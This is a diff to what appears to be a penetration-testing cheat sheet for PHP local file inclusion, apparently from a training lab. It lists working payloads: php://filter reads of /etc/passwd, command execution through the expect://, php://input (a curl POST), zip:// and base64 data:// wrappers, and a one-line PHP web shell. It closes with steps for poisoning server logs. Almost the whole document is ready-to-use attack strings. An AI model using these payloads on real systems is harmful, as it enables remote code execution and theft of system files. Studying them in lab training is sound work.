@@ -1,2 +1,15 @@
-echo '<?php system($_GET['cmd']); ?>' | base64  => PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=
-usage: http://blog.inlanefreight.com/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id
+| **Command** | **Description** |
+| --------------|-------------------|
+| `php://filter/read=convert.base64-encode/resource=/etc/passwd` | PHP filter to convert file contents to Base64 |
+| `php://filter/read=string.rot13/resource=/etc/passwd`   | PHP filter to convert file contents to ROT13 |
+| `expect://id` | Command execution with PHP `Expect` wrapper |
+| `curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input"` | Using PHP `Input` wrapper for command execution |
+| `zip://malicious.zip%23exec.php&cmd=id` | Command execution with the PHP `Zip` wrapper |
+| `<?php system($_GET['cmd']); ?>` | PHP web shell file contents (i.e., shell.php) |
+| `index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id` | Remote execution of base64 php code |
+
+Usage:
+1. find type of server
+2. find the log files
+3. try iterate to log files
+4. try poison log files
